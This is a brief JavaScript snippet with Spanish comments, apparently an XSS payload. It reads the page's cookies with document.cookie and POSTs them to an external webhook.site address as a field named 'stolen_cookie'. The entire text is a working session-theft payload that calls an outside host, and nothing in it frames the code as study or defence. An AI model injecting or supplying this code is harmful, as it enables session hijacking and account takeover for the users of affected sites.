// 1. Obtener la cookie
let cookieData = document.cookie;

// 2. Preparar el envío por POST
fetch('https://webhook.site/561be565-cf03-4612-86ae-cc054ec6f12b', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    // Codifica la cookie para que pueda ser enviada en el cuerpo
    body: 'stolen_cookie=' + encodeURIComponent(cookieData)
})
.then(response => {
    // Opcional: manejar la respuesta o evitar errores en la consola
})
.catch(error => {
    // Opcional: Manejar errores
});
